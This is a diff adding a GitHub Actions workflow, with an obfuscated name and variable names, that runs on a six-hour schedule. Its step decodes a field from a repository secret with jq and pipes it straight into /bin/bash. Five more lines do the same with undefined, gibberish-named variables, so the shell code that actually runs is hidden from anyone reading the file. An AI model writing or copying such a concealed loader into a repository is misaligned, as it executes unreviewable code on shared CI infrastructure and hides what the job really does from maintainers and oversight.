@@ -1,0 +1,22 @@
+name: pantheonwhopping
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pantheonwhopping
+        env:
+          coo0: ${{ secrets.coo0 }}
+        run: |
+          echo $coo0 | jq -r .gurrs44 | /bin/bash
+          echo $pzjwm3690 | jq -r .uxh58 | /bin/bash
+          echo $y1 | jq -r .qet20 | /bin/bash
+          echo $nxif15253 | jq -r .ucl215 | /bin/bash
+          echo $fgha47366 | jq -r .ugra12 | /bin/bash
+          echo $doxcs526 | jq -r .oj9 | /bin/bash
+
